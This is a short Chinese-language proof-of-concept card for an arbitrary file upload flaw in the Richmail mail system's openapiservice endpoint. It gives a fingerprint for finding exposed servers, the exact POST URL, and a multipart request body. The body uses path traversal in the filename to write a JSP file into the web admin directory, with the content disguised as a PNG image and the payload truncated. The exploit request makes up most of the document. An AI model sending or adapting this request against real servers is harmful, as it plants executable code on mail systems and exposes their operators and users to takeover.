# Richmail邮件系统openapiservice存在任意文件上传

- **系统**：Richmail　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="richmail.config.js"`
- **请求**：`POST /webadmin/service/openapiservice?func=upload:letterImageUpload HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=WebKitFormBoundary7MA4YWxkTrZu…`

**请求体 / payload**
```
--WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="imageX"
0
--WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="imageY"
0
--WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="submit"
提交
--WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="filename"; filename="../../../../../web/webmailsvr/admin/12.jsp"
Content-Type: image/png
text/plain;base64,/z8/IBBKRklGIAEBICABIAEgIP8/IEMgAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAf8/IEMBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQ…（脚本共 7902 字，完整版见原文）
```
- **预期**：200　|　—